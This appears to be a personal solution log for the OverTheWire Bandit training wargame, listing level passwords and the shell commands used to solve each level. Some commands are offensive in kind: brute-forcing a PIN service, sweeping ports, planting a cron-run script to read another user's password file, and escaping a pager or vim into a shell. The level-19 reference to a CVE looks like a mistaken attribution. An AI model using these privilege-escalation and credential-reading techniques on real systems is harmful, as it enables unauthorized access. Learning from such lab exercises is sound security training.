## bandit1: 
ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
## bandit2: 
263JGJPfgU6LtdEvgfWU1XP5yac29mFx

## bandit3: 
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
(cat -- '--spaces in this filename--')

## bandit4:
cat "...Hiding-From-You"


## bandit5: 
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw

## bandit6:
find inhere -type f -size 1033c -exec cat {} \;
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG

## bandit7:
 find / -size 33c \
  -user bandit7 \
  -group bandit6 -exec head {} \; 2> /dev/null

morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj

## bandit8:
grep "millionth"
dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc


## bandit9:
sort < data.txt | uniq --unique
4CKMh1JI91bUIZZPXDqGanal4xvAg0JM

## bandit10:
strings data.txt | grep '='
FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey

## bandit 11:
cat data.txt | base64 -d
dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr

## bandit 12:
rot13
7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4

## bandit13: 
unpack, decode or decompress  8 times
convert from hex dump to binary: xxd -r < data.txt
decompress: xxd -r < data.txt | \
  zcat | \
  file -
  decompress bzip2:
xxd -r < data.txt | zcat | \
  bzip2 --decompress --force --stdout | file -
  decompress tar: 
```bash
xxd -r < $HOME/data.txt | \
  zcat | \
  bzip2 --decompress --force --stdout | \
  zcat | \
  tar -xf -
```
  after we do mktemp -d an copy the data.txt to it
Unpack data5.bin: tar xvf data5.bin
Unpack data6.bin : tar xvf data6.bin
Unpack data8.bin: zcat data8.bin
FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn

## bandit 14:
sshkey.private

## bandit15:
echo 'MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS' | nc localhost 30000
the key is found in /etc/bandit_pass/bandit14

8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo


## bandit 16:
echo "bandit15_password" | openssl s_client -quiet -connect localhost:30001
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
## bandit17:
bash -c 'for i in $(seq 31000 32000); do
  echo "Trying port $i"
  echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client -quiet -connect "localhost:$i" 2>/dev/null
done'

## bandit 18:
diff passwords.new passwords.old
Found two passwords:
x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO: password for level 18 (returns bye bye and closes connection)
gvE89l3AhAhg3Mi9G2990zGnn42c8v20: password to bandit19

## bandit19:
Even tho we have the password we need to exploit CVE-2024-47516 
we pass the command directly when we connect to ssh
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 \
  cat readme
```

cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8


## bandit20
./bandit20-do cat /etc/bandit_pass/bandit
20
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO

## bandit 21
nc -l 20000 ctrl+z
./suconnect 20000 ctrl z
fg %1 and type paswword of bandit2
ctrl+z
fg%2 see response from suconnect
ctrl+z
fg%1
EeoULMCra2q0dSkYj561DX7s1CpBuOBt

## bandit 22
check cronjob_bandit22 in /etc/cron.d/
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat  /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q

## bandit 23
```bash
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5su
m | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349

```
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga


## bandit24
cat /usr/bin/cronjob_bandit24.sh
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
make a script to print the password file using the cron job

```bash
cat > /var/spool/bandit24/foo/cat_passwd <<EOF
#!/bin/bash
install --mode=444 /etc/bandit_pass/bandit24 /tmp/bandit_pass_bandit24
EOF
chmod +x /var/spool/bandit24/foo/cat_passwd
sleep 60
cat /tmp/bandit_pass_bandit24
```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## bandit25
bruteforcing all the combinations of the 4-number pincode
```bash
seq -f "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX %4g" 0 9999 |
    socat STDIO TCP4:localhost:30002 |
    grep -v Wrong!
```

iCi86ttT4KSNe1armKiwbQNmB3YJP3q4


## bandit 26
find the bash used by bandit26
```bash
bandit25@bandit:~$ cat /etc/passwd | grep -e bandit25 -e bandit26
bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ ls -la /usr/bin/showtext
-rwxr-xr-x 1 root root 58 Aug 15 13:16 /usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit25@bandit:~$ /usr/bin/showtext
more: cannot open /home/bandit25/text.txt: No such file or directory
bandit25@bandit:~$ HOME=/home/bandit26 /usr/bin/showtext
more: cannot open /home/bandit26/text.txt: Permission denied
bandit25@bandit:~$ ls $HOME
bandit26.sshkey
```
make the terminal smaller to trigger the execution of more.
While more is executing type vv to access vim then type :e /etc/bandit_pass/bandit26 then hit enter

s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ


## bandit27
same as bandit6
after opening vim execute
:set shell=/bin/sh  and hit enter
execute then :shell and we open a shell inside vim
 ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB


## bandit28:
make tmp dir using mktemp -d
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
connect using the password of bandit27
cd repo cat README
Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
## bandit29:
same as bandit28 
check git log -p README.md to find the password
 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7

## bandit30
same as bandit28
git branch -a reveals other branches
the hint is in the README they specify that the password is not stored in production
git log -o /origin/dev reveals the password

qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL

## bandit31
same as bandit28
git tag -l reveals secret
git show secret

fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy


## bandit 32
same as bandit28
create key.txt file having "May I come in ?"
git add -f key.txt
git commit -m yo
git push origin master
password is found in remote 
3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K

## bandit33

Uppercase shell
Escpae using $0
cat /etc/bandit_pass/bandit33

tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0


## bandit34
# THE END
